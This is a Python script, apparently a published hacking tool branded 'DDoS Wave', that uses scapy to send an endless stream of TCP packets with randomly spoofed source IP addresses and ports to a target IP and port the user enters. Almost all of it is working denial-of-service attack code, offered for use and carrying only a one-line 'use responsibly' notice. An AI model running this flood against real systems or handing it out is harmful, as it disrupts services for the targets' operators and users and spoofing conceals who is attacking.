#!/usr/bin/env python

from scapy.all import *
import sys
import random
import time


def print_banner():
    """Print the DDoS   Wave ASCII art banner."""
    banner = r"""
    
    
'||''|.   '||''|.            .|'''.|     '|| '||'  '|'                          
 ||   ||   ||   ||    ...    ||..  '      '|. '|.  .'   ....   .... ...   ....  
 ||    ||  ||    || .|  '|.   ''|||.       ||  ||  |   '' .||   '|.  |  .|...|| 
 ||    ||  ||    || ||   || .     '||       ||| |||    .|' ||    '|.|   ||      
.||...|'  .||...|'   '|..|' |'....|'         |   |     '|..'|'    '|     '|...' 

               >> Developed by Vettrivel <<

                
    """
    print(banner)
    print("Very Powerfull tool To Simulate a flood of TCP packets with randomized spoofed IPs")
    print("\n")
    print("===================================================================================")
    print("\n")




def generate_random_ip():
    """Generate a random IPv4 address."""
    return ".".join([str(random.randint(1, 254)) for _ in range(4)])

def send_packets(target_ip, target_port):
    """Send TCP packets to the target IP and port with random spoofed source IPs and ports."""
    print(f"\n[INFO] Target IP Address: {target_ip}")
    print(f"[INFO] Target Port: {target_port}")
    print("[INFO] Sending packets... Press Ctrl+C to stop.\n")
    
    packet_count = 0

    try:
        while True:
            src_ip = generate_random_ip()
            print(f"[+] Spoofed Source IP: {src_ip}")

            # Randomize source port range for each session
            start_port = random.randint(1, 1000)
            end_port = random.randint(1000, 65535)
            packets_sent_in_loop = 0

            for src_port in range(start_port, end_port):
                # Create IP and TCP layers
                ip_layer = IP(src=src_ip, dst=target_ip)
                tcp_layer = TCP(sport=src_port, dport=target_port)

                # Create and send the packet
                packet = ip_layer / tcp_layer
                send(packet, inter=0.01, verbose=False)

                packet_count += 1
                packets_sent_in_loop += 1
                print(f"    [+] Packet #{packet_count} sent from {src_ip}:{src_port} to {target_ip}:{target_port}")

                # Limit loop to 50 packets at a time
                if packets_sent_in_loop >= 50:
                    break

            # Short delay for readability
            time.sleep(1)

    except KeyboardInterrupt:
        print("\n[INFO] Process interrupted by user.")
        print(f"[INFO] Total packets sent: {packet_count}")
        sys.exit(0)

if __name__ == "__main__":
    print_banner()
    print("NOTE: Use responsibly and only in a controlled environment.\n")

    try:
        # Prompt user for target IP
        target_ip = input("Enter the Target IP Address: ").strip()

        # Validate IP address format (basic check)
        if not target_ip or len(target_ip.split(".")) != 4:
            print("[ERROR] Invalid IP address format. Exiting.")
            sys.exit(1)

        # Prompt user for target port
        try:
            target_port = int(input("Enter the Target Port: ").strip())
            if target_port < 1 or target_port > 65535:
                raise ValueError
        except ValueError:
            print("[ERROR] Invalid port number. Please enter a value between 1 and 65535.")
            sys.exit(1)

        # Start sending packets
        send_packets(target_ip, target_port)

    except Exception as e:
        print(f"[ERROR] {e}")
        sys.exit(1)
